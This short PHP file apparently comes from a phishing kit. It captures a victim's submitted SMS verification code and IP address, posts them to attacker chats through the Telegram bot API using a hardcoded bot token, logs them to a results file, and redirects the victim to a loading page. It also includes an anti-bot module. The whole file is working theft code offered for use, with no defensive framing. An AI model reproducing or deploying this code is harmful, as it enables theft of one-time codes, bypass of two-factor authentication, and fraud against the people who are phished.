<?php
include "anti/index.php";
include "id.php";
if(isset($_POST['okbba'])){
$ip = getenv("REMOTE_ADDR");
$message = "|==[ SMS INFO ]==|
|SMS Code  : ".$_POST['token']."
|IP      : ".$ip."
|==[ XTN SMS ]==|\n";
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot5265736875:AAFB5gkPar8bHcRWe98Rnj1Z-txuKF5xb7s/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);
}
$myfile = fopen("rzlt.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
HEADER("Location: loading2.php");
}
?>